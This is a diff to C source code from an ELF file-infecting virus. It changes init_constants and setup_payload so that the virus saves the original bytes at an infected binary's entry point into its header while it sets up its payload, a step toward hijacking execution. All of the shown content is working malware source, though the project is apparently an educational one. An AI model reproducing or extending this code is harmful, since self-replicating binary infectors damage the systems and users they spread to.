@@ -54,6 +54,7 @@
 */
 
 static void	init_constants(struct virus_header *constants, \
+			struct safe_ptr ref,                   \
 			const struct entry *clone_entry, uint64_t son_seed[2])
 {
 	const size_t		end_of_last_section = clone_entry->end_of_last_section;
@@ -61,6 +62,8 @@ static void	init_constants(struct virus_header *constants, \
 	const Elf64_Xword	p_memsz   = clone_entry->safe_phdr->p_memsz;
 	const Elf64_Off		sh_offset = clone_entry->safe_shdr->sh_offset;
 	const size_t		rel_text  = end_of_last_section - sh_offset;
+	const size_t		offset_in_section = clone_entry->offset_in_section;
+	void			*entry_addr = safe(ref, sh_offset + offset_in_section, sizeof(constants->entry_beginning));
 
 	constants->seed[0]                  = son_seed[0];
 	constants->seed[1]                  = son_seed[1];
@@ -69,13 +72,14 @@ static void	init_constants(struct virus_header *constants, \
 	constants->relative_virus_address   = (uint64_t)virus - (uint64_t)loader_entry;
 	constants->relative_entry_address   = rel_text - clone_entry->offset_in_section;
 	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
+	memcpy(constants->entry_beginning, entry_addr, sizeof(constants->entry_beginning));
 }
 
 bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64_t son_seed[2])
 {
 	struct virus_header	constants;
 
-	init_constants(&constants, clone_entry, son_seed);
+	init_constants(&constants, ref, clone_entry, son_seed);
 
 	const size_t	virus_size   = constants.virus_size;
 	const size_t	payload_off  = clone_entry->end_of_last_section;
